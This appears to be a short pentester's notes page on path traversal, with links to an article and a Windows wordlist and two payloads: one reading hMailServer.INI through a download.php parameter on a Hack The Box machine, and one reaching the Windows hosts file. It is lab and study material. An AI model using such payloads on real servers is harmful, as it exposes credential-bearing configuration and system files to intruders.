# Path Traversal

## Resources

- <https://medium.com/@Steiner254/directory-path-traversal-288a6188076>








## Windows

- <https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt>

Microsoft Internet Information Services (IIS) default location: `C:\inetpub\Wwwroot\`

```
# the webserver is C:\inetpub\wwwroot\mailing\ and uses hMailServer
http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI



../../../../../../../../windows/system32/drivers/etc/hosts

```